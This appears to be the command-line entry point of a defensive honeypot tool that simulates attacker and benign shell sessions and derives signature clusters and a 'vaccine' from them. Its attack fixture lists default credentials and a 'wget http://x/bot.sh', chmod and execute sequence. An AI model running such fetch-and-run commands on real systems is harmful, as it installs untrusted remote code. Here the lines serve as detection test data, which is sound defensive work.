import argparse, asyncio, json, random, time
from . import honeypot, telemetry, sdr, analysis, vaccine
from .telemetry import Event

ATTACK = [["root", "admin", "wget http://x/bot.sh", "chmod +x bot.sh", "./bot.sh"],
          ["admin", "123456", "wget http://x/bot.sh", "chmod +x bot.sh", "uname -a"]]
BENIGN = [["alice", "ls", "pwd"], ["bob", "cat notes.txt"]]

def simulate(n=6, seed=1):
    rnd = random.Random(seed); t = time.time(); evs = []; ben = []
    for i in range(n):
        lines = rnd.choice(ATTACK); t += 30
        evs.append(Event(t, "sim", "203.0.113.%d:4000" % (i % 3 + 1), lines, [0.1] * len(lines)))
    for lines in BENIGN:
        ben.append(Event(t, "sim", "198.51.100.7:5000", lines, [3.0] * len(lines)))
    return evs, ben

def main(argv=None):
    p = argparse.ArgumentParser(prog="nexus-shield")
    s = p.add_subparsers(dest="cmd", required=True)
    r = s.add_parser("run"); r.add_argument("--host", default="127.0.0.1"); r.add_argument("--port", type=int, default=2323); r.add_argument("--log", default="events.jsonl")
    s.add_parser("demo")
    a = p.parse_args(argv)
    if a.cmd == "run":
        asyncio.run(honeypot.serve(a.host, a.port, log=a.log))
    else:
        evs, ben = simulate()
        corr = sdr.correlate(evs, sdr.synth(evs))
        print("signature clusters:", {k: len(v) for k, v in analysis.cluster(evs).items()})
        print("sdr emitters:", sorted(set(corr.values())))
        v = vaccine.make(evs)
        print("vaccine:", json.dumps(v))
        print("evaluation:", vaccine.evaluate(v, evs, ben))

if __name__ == "__main__": main()
